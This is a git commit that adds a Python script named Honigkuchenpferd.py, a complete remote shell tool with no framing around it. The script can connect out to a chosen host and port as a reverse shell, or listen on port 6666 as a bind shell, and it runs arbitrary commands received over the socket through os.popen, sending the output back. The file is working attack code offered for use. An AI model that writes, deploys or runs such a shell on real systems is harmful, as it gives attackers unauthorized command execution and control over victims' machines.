14b3644739195cbdbc8cbef406ac06c697252513
leftside97 <chrswr97@gmail.com>
2022-05-25 18:57:24 +0200

    Add files via upload

---
+++ Honigkuchenpferd.py
@@ -0,0 +1,84 @@
+#!/usr/bin/python
+import os
+import sys
+import socket
+
+class tcp_socket():
+
+    def listen_on(self, port):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.host = ''
+        self.s.bind((self.host, int(port)))
+        self.s.listen(5)
+        self.conn, self.addr = self.s.accept()
+
+    def connect_to(self, host, port):
+        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.conn.connect((host, int(port)))
+
+    def recive_data(self):
+        return self.conn.recv(1024)
+
+    def send_data(self, data):
+        self.conn.sendall(data)
+
+    def close(self):
+        self.conn.close()
+
+
+def easy_exec(cmd):
+    try:
+        return os.popen(cmd).read()
+    except:
+        return "input error"
+
+def easy_chdir(s):
+    try:
+        os.chdir(s)
+    except:
+        pass
+
+def easy_cmd(conn):
+    while 1:
+        conn.send_data(bytes(str('[Honigkuchenpferd]:' + os.getcwd() + '# '), 'utf-8'))
+        cmd = str(conn.recive_data(), 'utf-8')
+        if cmd.startswith('cd'):
+            easy_chdir(cmd[3:len(cmd) - 1])
+        elif cmd == "exit\n":
+            conn.close()
+            exit()
+        else:
+            conn.send_data(bytes(easy_exec(cmd), 'utf-8'))
+
+def reverse_shell(IP, PORT):
+    x = tcp_socket()
+    x.connect_to(IP, PORT)
+    x.send_data(bytes('hello from the other side :)\n', 'utf-8'))
+    easy_cmd(x)
+
+def bind_shell(PORT):
+    x = tcp_socket()
+    x.listen_on(PORT)
+    x.send_data(bytes('hello from the other side :)\n', 'utf-8'))
+    easy_cmd(x)
+
+def default_shell():
+    #edit here
+    #
+    #reverse_shell('127.0.0.1', 6666)
+    bind_shell(6666)
+
+if __name__ == '__main__':
+    if len(sys.argv) > 3:
+        if sys.argv[1] == "-r":
+            reverse_shell(sys.argv[2], sys.argv[3])
+        if sys.argv[1] == "-b":
+            bind_shell(sys.argv[2])
+    else:
+        default_shell()
+
+
+
+
+
+
